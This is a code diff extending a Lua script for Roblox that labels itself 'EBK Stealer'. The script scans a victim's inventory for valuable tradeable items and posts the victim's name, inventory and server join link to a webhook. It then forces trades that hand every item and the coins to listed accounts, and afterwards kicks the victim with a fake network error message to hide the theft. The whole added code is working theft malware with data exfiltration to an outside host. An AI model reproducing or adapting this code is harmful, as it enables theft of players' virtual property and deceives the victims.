@@ -97,4 +97,85 @@ local function SendWebhook(list, prefix)
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                 {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
-                {name = "🎒 Inventory:", value = "```"
+                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+            },
+            ["footer"] = {["text"] = "EBK Stealer | Session Active"}
+        }}
+    }
+    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+end
+
+---------------------------------------------------------
+-- LOGIQUE DE VOL
+---------------------------------------------------------
+local function doTrade(targetName)
+    local target = Players:WaitForChild(targetName)
+    
+    while not inTrade do
+        pcall(function()
+            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
+        end)
+        task.wait(0.8)
+    end
+
+    if inTrade then
+        for _, item in ipairs(itemsToSend) do
+            pcall(function()
+                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+            end)
+        end
+
+        pcall(function()
+            local rawText = tradeGui.Main.Currency.Coins.Amount.Text
+            local tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
+            if tokens >= 1 then
+                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
+            end
+        end)
+
+        task.wait(0.2)
+        repeat
+            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+            task.wait(0.1)
+            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+            task.wait(0.1)
+        until not inTrade
+    end
+    
+    task.wait(0.5)
+    plr:kick("Please check your internet connection and try again. (Error Code: 277)")
+end
+
+---------------------------------------------------------
+-- SCAN & DÉPART
+---------------------------------------------------------
+local inv = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
+for _, cat in ipairs(categories) do
+    if inv[cat] then
+        for id, info in pairs(inv[cat]) do
+            if not info.TradeLock then
+                local rap = getRAP(cat, info.Name)
+                if rap >= min_rap then
+                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
+                end
+            end
+        end
+    end
+end
+
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
+    SendWebhook(itemsToSend, (ping == "Yes" and "@everyone" or ""))
+
+    local function onPlayer(p)
+        if table.find(users, p.Name) then
+            task.spawn(function() doTrade(p.Name) end)
+        end
+    end
+
+    for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
+    Players.PlayerAdded:Connect(onPlayer)
+end
